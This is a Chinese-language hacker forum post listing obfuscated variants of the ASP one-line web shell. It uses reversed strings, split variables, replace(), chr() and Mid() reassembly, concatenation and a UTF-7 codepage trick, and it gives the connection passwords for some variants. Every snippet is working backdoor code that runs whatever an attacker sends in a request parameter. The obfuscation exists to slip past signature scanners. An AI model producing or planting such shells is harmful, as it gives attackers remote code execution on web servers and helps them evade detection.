变形之后的Asp一句话：  

Author : RainShine

1.逆序法 

    <%execute(strreverse(")""xx""(tseuqer lave"))%>

2.拆分法(浑水摸鱼法)   

    <% 
    xx=request("xx") 
    eval xx 
    %> 

    <% 
    xx=request("xx") 
    Rain=xx 
    eval Rain 
    %>  

3.replace函数  

    <% 
    xxx="e0x0e0c0ut0e(0req0ue0st(""x0x""))" 
    xxx=replace(xxx,"0","") 
    eval xxx 
    %>


4. chr()连接字符串。例如
```<%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("sz"))%>```


5.Mid()连接字符串。 
这个貌似没人研究过（或者说没人发过），我就发一下吧。基本思路：乱序一个字符串然后反复Mid取字符构成一句话。 

    <% 
    Function d(s):d=Mid(love,s,1):End Function:love="(tqxuesrav l)"&"""":execute(d(6)&d(10)&d(9)&d(12)&d(11)&d(8)&d(6)&d(3)&d(5)&d(6)&d(7)&d(2)&d(1)&d(14)&d(4)&d(4)&d(14)&d(13)) 
    %>


6.字符连接成字符串 
    
    <%eval("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0″&"-"&"2″&"-"&"5″&")"&")")%>   密码-7  


差不多也就想到这些，已经成为酱油党，无法在某些领域发帖了。  

本人抗击打能力不错，抗打击能力一般，各位手下留情~   

------------苦逼的RainShine

> 另外一个白帽子的~~  
    <%@codepage=65000%>
    <%e+x-v+x-a+x-l(+x-r+x-e+x-q+x-u+x-e+x-s+x-t+x-(+x-+ACI-c+ACI)+x-)+x-%>  密码是：c